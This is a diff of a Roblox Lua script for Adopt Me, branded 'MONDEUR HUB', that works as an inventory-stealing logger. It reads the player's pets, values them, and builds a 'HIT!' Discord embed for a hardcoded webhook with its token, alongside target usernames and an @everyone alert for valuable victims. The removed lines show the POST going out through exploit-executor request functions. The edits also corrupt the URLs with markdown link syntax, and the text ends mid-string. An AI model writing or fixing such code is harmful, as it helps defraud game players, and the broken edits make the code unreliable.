@@ -2,10 +2,10 @@
 
 -- [[ CONFIG ]] --
 local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} 
-local WEBHOOK   = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+local WEBHOOK   = "[https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa](https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa)"
 local THRESHOLD = 0.13 
-local DISCORD_INV = "https://discord.gg/J4w2w5CW9"
-local VALUE_URL = "https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/ADM_PET_VALUE.txt"
+local DISCORD_INV = "[https://discord.gg/J4w2w5CW9](https://discord.gg/J4w2w5CW9)"
+local VALUE_URL = "[https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/ADM_PET_VALUE.txt](https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/ADM_PET_VALUE.txt)"
 
 -- 1. CLIPBOARD & INITIAL SILENCE
 if setclipboard then setclipboard(DISCORD_INV) end
@@ -18,20 +18,21 @@ local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- 3. GITHUB VALUE DATA LOADER
+-- 3. GITHUB VALUE DATA LOADER (Fully Fixed to ensure Elvebredd Values apply)
 local customValues = {}
 local function loadValues()
     local success, result = pcall(function()
         return game:HttpGet(VALUE_URL)
     end)
-    if success then
+    if success and type(result) == "string" then
         for line in result:gmatch("[^\r\n]+") do
             local name, val = line:match("([^,]+),([^,]+)")
             if name and val then
-                -- FIX: Replaced .trim() with pattern match to prevent Roblox crash
                 local cleanName = name:lower():match("^%s*(.-)%s*$")
-                if cleanName then
-                    customValues[cleanName] = tonumber(val)
+                local cleanVal = val:match("^%s*(.-)%s*$")
+                local numVal = tonumber(cleanVal)
+                if cleanName and numVal then
+                    customValues[cleanName] = numVal
                 end
             end
         end
@@ -94,7 +95,6 @@ end
 -- 6. VALUATION LOGIC
 local function getFinalValue(petData, props)
     local rawName = petData.name or ""
-    -- FIX: Replaced .trim() here as well
     local petName = rawName:lower():match("^%s*(.-)%s*$") or ""
     local base = customValues[petName] or petData.rvalue or 0
     
@@ -154,28 +154,22 @@ end
 
 local sortedPets, grandTotal, finalTradeList = processInventory()
 
--- 8. WEBHOOK DISPATCH (FIXED EOF AND MALFORMED STRING)
+-- 8. WEBHOOK DISPATCH (Fully Restored Spidey Bot Look & Error Free)
 if #sortedPets > 0 then
-    local lines = {}
+    local petLines = ""
     for _, p in ipairs(sortedPets) do
-        table.insert(lines, p.emoji.." "..p.name.." "..p.count.."x (₱"..string.format("%.2f", p.price)..")")
+        local line = p.emoji .. "  " .. p.name .. " " .. p.count .. "x (₱" .. string.format("%.2f", p.price) .. ")\n"
+        if #petLines + #line > 3000 then
+            petLines = petLines .. "➕ And more items...\n"
+            break
+        end
+        petLines = petLines .. line
     end
+
+    local bestPet = sortedPets[1] and sortedPets[1].name or "None"
 
     local payload = HttpService:JSONEncode({
         content = (grandTotal >= 500 and "@everyone" or ""),
         embeds = {{
-            title = "MONDEUR HUB | 🦊 GHOST HIT!",
-            description = "This is my script for Adopt Me!\n\n" .. table.concat(lines, "\n")
-        }}
-    })
-
-    local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-    if req then
-        req({
-            Url = WEBHOOK,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = payload
-        })
-    end
-end
+            title = "MONDEUR HUB | 🦊 HIT!",
+            description = "
